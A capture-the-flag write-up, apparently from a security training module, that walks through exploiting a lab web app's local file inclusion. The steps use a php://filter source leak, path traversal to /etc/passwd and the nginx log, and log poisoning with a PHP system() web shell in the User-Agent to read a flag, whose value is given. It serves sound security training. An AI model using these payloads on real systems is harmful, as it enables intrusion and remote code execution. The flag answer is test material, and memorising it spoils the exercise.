@@ -1,1 +1,41 @@
 
+Scenario
+The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.
+
+They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.
+
+Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.
+
+Don't forget to think outside the box!
+
+
+CHALLENGE: 94.237.59.30:59925
+
+Question 1 - Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
+1) we see if we hover over the about us section it looks like this -> http://94.237.59.30:59925/index.php?page=about
+so we will have to converty the php filters 
+2) view-source:http://94.237.59.30:59925/index.php?page=php://filter/convert.base64-encode/resource=index
+3) get base64 then we decode -> echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+SW5sYW5lRnJlaWdodDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+Cgo8L2hlYWQ+Cjxib2R5PgoKCjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4gICAgCiAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7CiAgICBmdW5jdGlvbiBwcmV2ZW50KCkKICAgIHsKICAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7IAogICAgfQogICAgPC9zY3JpcHQ+CgkKPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iYy5jc3MiIC8+CgoKCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgewoJcGFkZGluZy10b3A6IDYwcHg7CglwYWRkaW5nLWJvdHRvbTogNDBweDsKfQoKLnNpZGViYXItbmF2IHsKICBwYWRkaW5nOiA5cHggMDsKICBtYXJnaW4tdG9wOiAzMHB4Owp9Ci5tYWluUGFnZXsKCWhlaWdodDogMTAwJQp9CgpAbWVkaWEgKCBtYXgtd2lkdGggOiA5ODBweCkgewoJLyogRW5hYmxlIHVzZSBvZiBmbG9hdGVkIG5hdmJhciB0ZXh0ICovCgkubmF2YmFyLXRleHQucHVsbC1yaWdodCB7CgkJZmxvYXQ6IG5vbmU7CgkJcGFkZGluZy1sZWZ0OiA1cHg7CgkJcGFkZGluZy1yaWdodDogNXB4OwoJfQp9CgouZGlzcGxheSB7CiAgd2lkdGg6IDcwJTsKICBoZWlnaHQ6IDQwMHB4OwogIHBhZGRpbmctYm90dG9tOiAyNTBweDsKICBib3JkZXI6IDFweCBzb2xpZCBibGFjazsgCiAgbWFyZ2luLWxlZnQ6IDI1MHB4OwogIG1hcmdpbi10b3A6IDMwcHg7CiAgb3ZlcmZsb3cteTogc2Nyb2xsOwp9Cgo8L3N0eWxlPgoKPHRpdGxlPklubGFuZUZyZWlnaHQ8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keSBvbmxvYWQ9InByZXZlbnQoKTsiICBvbnVubG9hZD0iIj4KCTxkaXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSBuYXZiYXItZml4ZWQtdG9wIj4KCQk8ZGl2IGNsYXNzPSJuYXZiYXItaW5uZXIiPgoJCQk8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgoJCQkJPGEgY2xhc3M9ImJyYW5kIj5BZG1pbiBQYW5lbDwvYT4KCQkJCTxkaXYgY2xhc3M9Im5hdi1jb2xsYXBzZSBjb2xsYXBzZSI+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9kaXY+CgoJPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KCQk8ZGl2IGNsYXNzPSJyb3ctZmx1aWQgbWFpblBhZ2UiPgoJCQk8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KCQkJCTxkaXYgY2xhc3M9IndlbGwgc2lkZWJhci1uYXYiPgoJCQkJCTx1bCBpZD0ic2lkZUJhciIgY2xhc3M9Im5hdiBuYXYtbGlzdCI+CgkJCQkJCTxsaSBjbGFzcz0ibmF2LWhlYWRlciI+RGF0YSBMb2dzPC9saT4KCQkJCQkJCTxsaSBpZD0ibXRtaS1tZW51IiBuYW1lPSJtb250aGluZm8iPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9Y2hhdC5sb2ciPjxzcGFuPkNoYXQgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQkJPGxpIGlkPSJtdG1pLW1lbnUiIG5hbWU9Im10bWkiPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9aHR0cC5sb2ciPjxzcGFuPlNlcnZpY2UgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQk8bGkgY2xhc3M9Im5hdi1oZWFkZXIiPlBlcmZvcm1hbmNlIFZpZXc8L2xpPgoJCQkJCQkJPGxpIGlkPSJtb250aGluZm8tbWVudSIgbmFtZT0ibW9udGhpbmZvIj48YSBocmVmPSJpbmRleC5waHA/bG9nPXN5c3RlbS5sb2ciPjxzcGFuPlN5c3RlbSBMb2c8L3NwYW4+PC9hPjwvbGk+CgkJCQkJPC91bD4KCQkJCTwvZGl2PgoJCQkJPCEtLS8ud2VsbCAtLT4KCQkJPC9kaXY+CgkJPC9kaXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9ImRpc3BsYXkiPgoJPD9waHAKCWlmKGlzc2V0KCRfR0VUWydsb2cnXSkpIHsKCSAgJGxvZyA9ICJsb2dzLyIgLiAkX0dFVFsnbG9nJ107CgkgIGVjaG8gIjxwcmU+IjsKCSAgaW5jbHVkZSAkbG9nOwoJICBlY2hvICI8L3ByZT4iOwoJfQoJPz4KCTwvZGl2PgoJCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9ImpzL2Jvb3RzdHJhcC5qcyI+PC9zY3JpcHQ+CgkKPC9ib2R5Pgo8L2h0bWw+CjwhLS0gcGFydGlhbCAtLT4KICAKPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d
+4) we see this in output:
+if(isset($_GET['log'])) {
+	  $log = "logs/" . $_GET['log'];
+	  echo "<pre>";
+	  include $log;
+	  echo "</pre>";
+
+5) From within the ilf_admin/index page source, students will notice that there exists a basic LFI vulnerability:
+if(isset($_GET['log'])) {
+	  $log = "logs/" . $_GET['log'];
+	  echo "<pre>";
+	  include $log;
+	  echo "</pre>";
+
+6) curl -s http://94.237.59.30:59925/ilf_admin/index.php?log=../../../../../../../etc/passwd | tr "\n" "|" | grep -o '<pre>.*</pre>'
+we get the /etc/passwd for output
+7) now we have to figure out if its nginx or apache on backend -> curl -s http://94.237.59.30:59925/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log | tr "\n" "|" | grep -o '<pre>.*</pre>'
+output: is ngnix 
+7) capture burp resquest first change the user-agent to <?php system($_GET['cmd']); ?> + hit repeater then hit forward 
+8) in repeater change GET /ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=ls+/ HTTP/1.1
+9) find flag_dacc60f2348d.txt 
+10) now change GET to -> GET /ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt
+11) scroll and find: a9a892dbc9faf9a014f58e007721835e
